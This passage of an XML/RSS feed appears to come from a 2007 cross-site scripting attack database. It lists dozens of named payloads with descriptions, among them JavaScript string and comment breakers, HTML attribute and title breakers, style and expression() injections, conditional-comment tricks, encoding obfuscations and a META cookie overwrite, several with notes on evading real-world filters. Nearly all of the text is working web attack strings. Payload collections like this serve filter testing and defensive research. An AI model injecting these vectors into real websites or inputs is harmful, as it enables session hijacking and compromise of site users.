<ddb:exploitString>};a=eval;b=alert;a(b(12));//</ddb:exploitString>      <ddb:exploitTags>general, JS breaking</ddb:exploitTags>    </item>    <item>      <title>Basic JS breaker variant 8</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1861</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;Basic JS breaker variant 8&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;a=1;a=eval;b=alert;a(b(11));//&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;Can be used when JS can be injected directly.&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, JS breaking, basic, obfuscated&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;kishor</description>      <pubDate>Sun, 22 Jul 07 09:37:46 -0400</pubDate>      <ddb:authorName>kishor</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>Can be used when JS can be injected directly.</ddb:exploitDescription>      <ddb:exploitName>Basic JS breaker variant 8</ddb:exploitName>      <ddb:exploitString>a=1;a=eval;b=alert;a(b(11));//</ddb:exploitString>      <ddb:exploitTags>general, JS breaking, basic, obfuscated</ddb:exploitTags>    </item>    <item>      <title>Basic JS breaker variant 9</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1860</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;Basic JS breaker variant 9&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;;//%0da=eval;b=alert;a(b(10));//&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;Breaks double quoted strings, injects a comment, carriage return and finally an alert.&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, JS breaking, CRLF&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;kishor</description>      <pubDate>Mon, 13 Aug 07 10:37:29 -0400</pubDate>      <ddb:authorName>kishor</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>Breaks double quoted strings, injects a comment, carriage return and finally an alert.</ddb:exploitDescription>      <ddb:exploitName>Basic JS breaker variant 9</ddb:exploitName>      <ddb:exploitString>;//%0da=eval;b=alert;a(b(10));//</ddb:exploitString>      <ddb:exploitTags>general, JS breaking, CRLF</ddb:exploitTags>    </item>    <item>      <title>Basic JS breaker variant 10</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1859</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;Basic JS breaker variant 10&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;';//%0da=eval;b=alert;a(b(9));//&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;Breaks single quoted strings, injects a comment, carriage return and finally an alert.&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, JS breaking, basic, obfuscated, CRLF&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;kishor</description>      <pubDate>Mon, 13 Aug 07 10:40:02 -0400</pubDate>      <ddb:authorName>kishor</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>Breaks single quoted strings, injects a comment, carriage return and finally an alert.</ddb:exploitDescription>      <ddb:exploitName>Basic JS breaker variant 10</ddb:exploitName>      <ddb:exploitString>';//%0da=eval;b=alert;a(b(9));//</ddb:exploitString>      <ddb:exploitTags>general, JS breaking, basic, obfuscated, CRLF</ddb:exploitTags>    </item>    <item>      <title>Basic single quoted attribute breaker</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1826</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;Basic single quoted attribute breaker&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;'&gt; &lt;script&gt;alert(3)&lt;/script&gt;&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;This vector breaks single quoted attributes and appends an alert.&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, html breaking, basic&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;kishor</description>      <pubDate>Sun, 22 Jul 07 09:37:46 -0400</pubDate>      <ddb:authorName>kishor</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>This vector breaks single quoted attributes and appends an alert.</ddb:exploitDescription>      <ddb:exploitName>Basic single quoted attribute breaker</ddb:exploitName>      <ddb:exploitString>'&gt; &lt;script&gt;alert(3)&lt;/script&gt;</ddb:exploitString>      <ddb:exploitTags>general, html breaking, basic</ddb:exploitTags>    </item>    <item>      <title>Basic title breaker</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1827</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;Basic title breaker&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;&lt;/title&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;This basic vector breaks HTML titles and injects JavaScript.&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, html breaking, basic, title breaking&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;kishor</description>      <pubDate>Sun, 22 Jul 07 15:26:43 -0400</pubDate>      <ddb:authorName>kishor</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>This basic vector breaks HTML titles and injects JavaScript.</ddb:exploitDescription>      <ddb:exploitName>Basic title breaker</ddb:exploitName>      <ddb:exploitString>&lt;/title&gt;&lt;script&gt;alert(1)&lt;/script&gt;</ddb:exploitString>      <ddb:exploitTags>general, html breaking, basic, title breaking</ddb:exploitTags>    </item>    <item>      <title>BGSOUND</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1871</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;BGSOUND&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;&lt;BGSOUND SRC=&quot;javascript:alert('XSS');&quot;&gt;&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;BGSOUND&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, evil tags&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;ha.ckers.org</description>      <pubDate>Sun, 22 Jul 07 10:11:40 -0400</pubDate>      <ddb:authorName>ha.ckers.org</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>BGSOUND</ddb:exploitDescription>      <ddb:exploitName>BGSOUND</ddb:exploitName>      <ddb:exploitString>&lt;BGSOUND SRC=&quot;javascript:alert('XSS');&quot;&gt;</ddb:exploitString>      <ddb:exploitTags>general, evil tags</ddb:exploitTags>    </item>    <item>      <title>BODY background-image</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1872</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;BODY background-image&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;&lt;BODY BACKGROUND=&quot;javascript:alert('XSS');&quot;&gt;&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;BODY image&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, evil tags&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;ha.ckers.org</description>      <pubDate>Sun, 22 Jul 07 10:11:48 -0400</pubDate>      <ddb:authorName>ha.ckers.org</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>BODY image</ddb:exploitDescription>      <ddb:exploitName>BODY background-image</ddb:exploitName>      <ddb:exploitString>&lt;BODY BACKGROUND=&quot;javascript:alert('XSS');&quot;&gt;</ddb:exploitString>      <ddb:exploitTags>general, evil tags</ddb:exploitTags>    </item>    <item>      <title>BODY ONLOAD</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1873</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;BODY ONLOAD&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;&lt;BODY ONLOAD=alert('XSS')&gt;&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;BODY tag (I like this method because it doesn't require using any variants of ”javascript:” or ”&lt;SCRIPT...” to accomplish the XSS attack)&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, evil tags&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;ha.ckers.org</description>      <pubDate>Sun, 22 Jul 07 10:11:58 -0400</pubDate>      <ddb:authorName>ha.ckers.org</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>BODY tag (I like this method because it doesn't require using any variants of ”javascript:” or ”&lt;SCRIPT...” to accomplish the XSS attack)</ddb:exploitDescription>      <ddb:exploitName>BODY ONLOAD</ddb:exploitName>      <ddb:exploitString>&lt;BODY ONLOAD=alert('XSS')&gt;</ddb:exploitString>      <ddb:exploitTags>general, evil tags</ddb:exploitTags>    </item>    <item>      <title>Camouflaged comment injection with JS link</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=2041</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;Camouflaged comment injection with JS link&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;&lt;!--&lt;br&gt;&lt;A href=&quot;&lt;br&gt;- --&gt;&lt;a href=javascript:alert:document.domain&lt;br&gt;&gt;test--&gt;&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;This vector evades filters by camouflaging as a comment and inhabiting a JS link.&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, obfuscated, comment breaking, internet explorer&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;thespanner.co.uk</description>      <pubDate>Fri, 03 Aug 07 08:45:22 -0400</pubDate>      <ddb:authorName>thespanner.co.uk</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>This vector evades filters by camouflaging as a comment and inhabiting a JS link.</ddb:exploitDescription>      <ddb:exploitName>Camouflaged comment injection with JS link</ddb:exploitName>      <ddb:exploitString>&lt;!--&#13;&#10;&lt;A href=&quot;&#13;&#10;- --&gt;&lt;a href=javascript:alert:document.domain&#13;&#10;&gt;test--&gt;</ddb:exploitString>      <ddb:exploitTags>general, obfuscated, comment breaking, internet explorer</ddb:exploitTags>    </item>    <item>      <title>Case Insensitive</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1925</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;Case Insensitive&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;&lt;IMG SRC=JaVaScRiPt:alert('XSS')&gt;&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;Case insensitive XSS attack vector.&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, evil tags, obfuscated&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;ha.ckers.org</description>      <pubDate>Sun, 22 Jul 07 10:32:06 -0400</pubDate>      <ddb:authorName>ha.ckers.org</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>Case insensitive XSS attack vector.</ddb:exploitDescription>      <ddb:exploitName>Case Insensitive</ddb:exploitName>      <ddb:exploitString>&lt;IMG SRC=JaVaScRiPt:alert('XSS')&gt;</ddb:exploitString>      <ddb:exploitTags>general, evil tags, obfuscated</ddb:exploitTags>    </item>    <item>      <title>Character Encoding Example</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1924</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;Character Encoding Example&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;&lt;%3C&amp;lt&amp;lt;&amp;LT&amp;LT;&amp;#60&amp;#060&amp;#0060&amp;#00060&amp;#000060&amp;#0000060&amp;#60;&amp;#060;&amp;#0060;&amp;#00060;&amp;#000060;&amp;#0000060;&amp;#x3c&amp;#x03c&amp;#x003c&amp;#x0003c&amp;#x00003c&amp;#x000003c&amp;#x3c;&amp;#x03c;&amp;#x003c;&amp;#x0003c;&amp;#x00003c;&amp;#x000003c;&amp;#X3c&amp;#X03c&amp;#X003c&amp;#X0003c&amp;#X00003c&amp;#X000003c&amp;#X3c;&amp;#X03c;&amp;#X003c;&amp;#X0003c;&amp;#X00003c;&amp;#X000003c;&amp;#x3C&amp;#x03C&amp;#x003C&amp;#x0003C&amp;#x00003C&amp;#x000003C&amp;#x3C;&amp;#x03C;&amp;#x003C;&amp;#x0003C;&amp;#x00003C;&amp;#x000003C;&amp;#X3C&amp;#X03C&amp;#X003C&amp;#X0003C&amp;#X00003C&amp;#X000003C&amp;#X3C;&amp;#X03C;&amp;#X003C;&amp;#X0003C;&amp;#X00003C;&amp;#X000003C;\x3c\x3C\u003c\u003C&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;All of the possible combinations of the character ”&lt;” in HTML and JavaScript.  Most of these won't render, but many of them can get rendered in certain circumstances (standards are great, aren't they?).&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, evil tags, obfuscated&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;ha.ckers.org</description>      <pubDate>Sun, 22 Jul 07 10:32:14 -0400</pubDate>      <ddb:authorName>ha.ckers.org</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>All of the possible combinations of the character ”&lt;” in HTML and JavaScript.  Most of these won't render, but many of them can get rendered in certain circumstances (standards are great, aren't they?).</ddb:exploitDescription>      <ddb:exploitName>Character Encoding Example</ddb:exploitName>      <ddb:exploitString>&lt;%3C&amp;lt&amp;lt;&amp;LT&amp;LT;&amp;#60&amp;#060&amp;#0060&amp;#00060&amp;#000060&amp;#0000060&amp;#60;&amp;#060;&amp;#0060;&amp;#00060;&amp;#000060;&amp;#0000060;&amp;#x3c&amp;#x03c&amp;#x003c&amp;#x0003c&amp;#x00003c&amp;#x000003c&amp;#x3c;&amp;#x03c;&amp;#x003c;&amp;#x0003c;&amp;#x00003c;&amp;#x000003c;&amp;#X3c&amp;#X03c&amp;#X003c&amp;#X0003c&amp;#X00003c&amp;#X000003c&amp;#X3c;&amp;#X03c;&amp;#X003c;&amp;#X0003c;&amp;#X00003c;&amp;#X000003c;&amp;#x3C&amp;#x03C&amp;#x003C&amp;#x0003C&amp;#x00003C&amp;#x000003C&amp;#x3C;&amp;#x03C;&amp;#x003C;&amp;#x0003C;&amp;#x00003C;&amp;#x000003C;&amp;#X3C&amp;#X03C&amp;#X003C&amp;#X0003C&amp;#X00003C&amp;#X000003C&amp;#X3C;&amp;#X03C;&amp;#X003C;&amp;#X0003C;&amp;#X00003C;&amp;#X000003C;\x3c\x3C\u003c\u003C</ddb:exploitString>      <ddb:exploitTags>general, evil tags, obfuscated</ddb:exploitTags>    </item>    <item>      <title>Closing JS Tag in JS String assignment</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=3156</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;Closing JS Tag in JS String assignment&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;&lt;script&gt;&lt;br&gt;var a = &quot;&lt;/script&gt; &lt;script&gt; alert('XSS !'); &lt;/script&gt; &lt;script&gt;&quot;;&lt;br&gt;&lt;/script&gt;&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;For some reason, Firefox picks up the script closing tag in the quoted string and then proceeds to process the remaining script tags as code.&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, gecko, obfuscated, evil tags&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;t3rmin4t0r</description>      <pubDate>Sat, 25 Aug 07 05:46:16 -0400</pubDate>      <ddb:authorName>t3rmin4t0r</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>For some reason, Firefox picks up the script closing tag in the quoted string and then proceeds to process the remaining script tags as code.</ddb:exploitDescription>      <ddb:exploitName>Closing JS Tag in JS String assignment</ddb:exploitName>      <ddb:exploitString>&lt;script&gt;&#13;&#10;var a = &quot;&lt;/script&gt; &lt;script&gt; alert('XSS !'); &lt;/script&gt; &lt;script&gt;&quot;;&#13;&#10;&lt;/script&gt;&#13;&#10;</ddb:exploitString>      <ddb:exploitTags>general, gecko, obfuscated, evil tags</ddb:exploitTags>    </item>    <item>      <title>Commented-out Block</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1917</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;Commented-out Block&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;&lt;!--[if gte IE 4]&gt;&lt;SCRIPT&gt;alert('XSS');&lt;/SCRIPT&gt;&lt;![endif]--&gt;&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;Downlevel-Hidden block (only works in IE5.0 and later and Netscape 8.1 in IE rendering engine mode).  Some websites consider anything inside a comment block to be safe and therefore it does not need to be removed, which allows our XSS vector. Or the system could add comment tags around something to attempt to render it harmless.  As we can see, that probably wouldn't do the job.&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, obfuscated, conditional comments, internet explorer&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;ha.ckers.org</description>      <pubDate>Sun, 22 Jul 07 10:37:15 -0400</pubDate>      <ddb:authorName>ha.ckers.org</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>Downlevel-Hidden block (only works in IE5.0 and later and Netscape 8.1 in IE rendering engine mode).  Some websites consider anything inside a comment block to be safe and therefore it does not need to be removed, which allows our XSS vector. Or the system could add comment tags around something to attempt to render it harmless.  As we can see, that probably wouldn't do the job.</ddb:exploitDescription>      <ddb:exploitName>Commented-out Block</ddb:exploitName>      <ddb:exploitString>&lt;!--[if gte IE 4]&gt;&lt;SCRIPT&gt;alert('XSS');&lt;/SCRIPT&gt;&lt;![endif]--&gt;</ddb:exploitString>      <ddb:exploitTags>general, obfuscated, conditional comments, internet explorer</ddb:exploitTags>    </item>    <item>      <title>Comment-breaker using obfuscated JavaScript</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1829</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;Comment-breaker using obfuscated JavaScript&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;*/a=eval;b=alert;a(b(/e/.source));/*&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;This vector creates an alert by breaking multiline comments.&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, comment breaking, JS breaking&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;kishor</description>      <pubDate>Sun, 22 Jul 07 09:37:46 -0400</pubDate>      <ddb:authorName>kishor</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>This vector creates an alert by breaking multiline comments.</ddb:exploitDescription>      <ddb:exploitName>Comment-breaker using obfuscated JavaScript</ddb:exploitName>      <ddb:exploitString>*/a=eval;b=alert;a(b(/e/.source));/*</ddb:exploitString>      <ddb:exploitTags>general, comment breaking, JS breaking</ddb:exploitTags>    </item>    <item>      <title>Conditional style injection for IE</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=2674</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;Conditional style injection for IE&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;width: expression((window.r==document.cookie)?'':alert(r=document.cookie))&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;This vector uses JavaScript conditional statements to inject an alert into CSS properties - it was once used as a PoC for a vulnerability in Stefan Di Paolos data binding example.&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, obfuscated, internet explorer, style injection&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;DoctorDan</description>      <pubDate>Thu, 16 Aug 07 02:42:58 -0400</pubDate>      <ddb:authorName>DoctorDan</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>This vector uses JavaScript conditional statements to inject an alert into CSS properties - it was once used as a PoC for a vulnerability in Stefan Di Paolos data binding example.</ddb:exploitDescription>      <ddb:exploitName>Conditional style injection for IE</ddb:exploitName>      <ddb:exploitString>width: expression((window.r==document.cookie)?'':alert(r=document.cookie))</ddb:exploitString>      <ddb:exploitTags>general, obfuscated, internet explorer, style injection</ddb:exploitTags>    </item>    <item>      <title>Content Replace</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1977</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;Content Replace&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;&lt;A HREF=&quot;http://www.gohttp://www.google.com/ogle.com/&quot;&gt;XSS&lt;/A&gt;&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;Content replace as an attack vector (assuming ”http://www.google.com/” is programmatically replaced with null). I actually used a similar attack vector against a several separate real world XSS filters by using the conversion filter itself (like http://quickwired.com/kallahar/smallprojects/php_xss_filter_function.php) to help create the attack vector (”java&amp;#x26;#x09;script:” was converted into ”java&amp;#x09;script:”.&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, evil tags, obfuscated&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;ha.ckers.org</description>      <pubDate>Sun, 22 Jul 07 10:37:29 -0400</pubDate>      <ddb:authorName>ha.ckers.org</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>Content replace as an attack vector (assuming ”http://www.google.com/” is programmatically replaced with null). I actually used a similar attack vector against a several separate real world XSS filters by using the conversion filter itself (like http://quickwired.com/kallahar/smallprojects/php_xss_filter_function.php) to help create the attack vector (”java&amp;#x26;#x09;script:” was converted into ”java&amp;#x09;script:”.</ddb:exploitDescription>      <ddb:exploitName>Content Replace</ddb:exploitName>      <ddb:exploitString>&lt;A HREF=&quot;http://www.gohttp://www.google.com/ogle.com/&quot;&gt;XSS&lt;/A&gt;</ddb:exploitString>      <ddb:exploitTags>general, evil tags, obfuscated</ddb:exploitTags>    </item>    <item>      <title>Cookie Manipulation</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1918</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;Cookie Manipulation&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;&lt;META HTTP-EQUIV=&quot;Set-Cookie&quot; Content=&quot;USERID=&lt;SCRIPT&gt;alert('XSS')&lt;/SCRIPT&gt;&quot;&gt;&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;Cookie manipulation - admittedly this is pretty obscure but I have seen a few examples where &lt;META is allowed and you can user it to overwrite cookies. There are other examples of sites where instead of fetching the username from a database it is stored inside of a cookie to be displayed only to the user who visits the page. With these two scenarios combined you can modify the victim's cookie which will be displayed back to them as JavaScript (you can also use this to log people out or change their user states, get them to log in as you, etc).&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, evil tags&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;ha.ckers.org</description>      <pubDate>Sun, 22 Jul 07 10:38:35 -0400</pubDate>      <ddb:authorName>ha.ckers.org</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>Cookie manipulation - admittedly this is pretty obscure but I have seen a few examples where &lt;META is allowed and you can user it to overwrite cookies. There are other examples of sites where instead of fetching the username from a database it is stored inside of a cookie to be displayed only to the user who visits the page. With these two scenarios combined you can modify the victim's cookie which will be displayed back to them as JavaScript (you can also use this to log people out or change their user states, get them to log in as you, etc).</ddb:exploitDescription>      <ddb:exploitName>Cookie Manipulation</ddb:exploitName>      <ddb:exploitString>&lt;META HTTP-EQUIV=&quot;Set-Cookie&quot; Content=&quot;USERID=&lt;SCRIPT&gt;alert('XSS')&lt;/SCRIPT&gt;&quot;&gt;</ddb:exploitString>      <ddb:exploitTags>general, evil tags</ddb:exploitTags>    </item>    <item>      <title>DIV background-image 1</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1874</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;DIV background-image 1&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;&lt;DIV STYLE=&quot;background-image: url(javascript:alert('XSS'))&quot;&gt;&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;Div background-image&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, evil tags, style injection&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;ha.ckers.org</description>      <pubDate>Sun, 22 Jul 07 10:12:36 -0400</pubDate>      <ddb:authorName>ha.ckers.org</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>Div background-image</ddb:exploitDescription>      <ddb:exploitName>DIV background-image 1</ddb:exploitName>      <ddb:exploitString>&lt;DIV STYLE=&quot;background-image: url(javascript:alert('XSS'))&quot;&gt;</ddb:exploitString>      <ddb:exploitTags>general, evil tags, style injection</ddb:exploitTags>    </item>    <item>      <title>DIV background-image 2</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1875</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;DIV background-image 2&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;&lt;DIV STYLE=&quot;background-image: url(&amp;#1;javascript:alert('XSS'))&quot;&gt;&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;Div background-image plus extra characters.  I built a quick XSS fuzzer to detect any erroneous characters that are allowed after the open parenthesis but before the JavaScript directive in IE and Netscape 8.1 in secure site mode. These are in decimal but you can include hex and add padding of course.  (Any of the following chars can be used: 1-32, 34, 39, 160, 8192-8203, 12288, 65279)&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, evil tags, style injection&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;ha.ckers.org</description>      <pubDate>Sun, 22 Jul 07 10:12:48 -0400</pubDate>      <ddb:authorName>ha.ckers.org</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>Div background-image plus extra characters.  I built a quick XSS fuzzer to detect any erroneous characters that are allowed after the open parenthesis but before the JavaScript directive in IE and Netscape 8.1 in secure site mode. These are in decimal but you can include hex and add padding of course.  (Any of the following chars can be used: 1-32, 34, 39, 160, 8192-8203, 12288, 65279)</ddb:exploitDescription>      <ddb:exploitName>DIV background-image 2</ddb:exploitName>      <ddb:exploitString>&lt;DIV STYLE=&quot;background-image: url(&amp;#1;javascript:alert('XSS'))&quot;&gt;</ddb:exploitString>      <ddb:exploitTags>general, evil tags, style injection</ddb:exploitTags>    </item>    <item>      <title>DIV expression</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1876</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;DIV expression&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;&lt;DIV STYLE=&quot;width: expression(alert('XSS'));&quot;&gt;&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;Div expression - a variant of this was effective against a real world cross site scripting filter using a newline between the colon and ”expression”&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, evil tags, style injection,  internet explorer&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;ha.ckers.org</description>      <pubDate>Sun, 22 Jul 07 10:13:25 -0400</pubDate>      <ddb:authorName>ha.ckers.org</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>Div expression - a variant of this was effective against a real world cross site scripting filter using a newline between the colon and ”expression”</ddb:exploitDescription>      <ddb:exploitName>DIV expression</ddb:exploitName>      <ddb:exploitString>&lt;DIV STYLE=&quot;width: expression(alert('XSS'));&quot;&gt;</ddb:exploitString>      <ddb:exploitTags>general, evil tags, style injection,  internet explorer</ddb:exploitTags>    </item>    <item>      <title>DIV w/Unicode</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1931</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;DIV w/Unicode&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;&lt;DIV STYLE=&quot;background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029&quot;&gt;&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;DIV background-image with unicoded XSS exploit (this has been modified slightly to obfuscate the url parameter).  The original vulnerability was found by Renaud Lifchitz (http://www.sysdream.com) as a vulnerability in Hotmail.&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, evil tags, obfuscated&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;ha.ckers.org</description>      <pubDate>Sun, 22 Jul 07 10:38:45 -0400</pubDate>      <ddb:authorName>ha.ckers.org</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>DIV background-image with unicoded XSS exploit (this has been modified slightly to obfuscate the url parameter).  The original vulnerability was found by Renaud Lifchitz (http://www.sysdream.com) as a vulnerability in Hotmail.</ddb:exploitDescription>      <ddb:exploitName>DIV w/Unicode</ddb:exploitName>      <ddb:exploitString>&lt;DIV STYLE=&quot;background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029&quot;&gt;</ddb:exploitString>      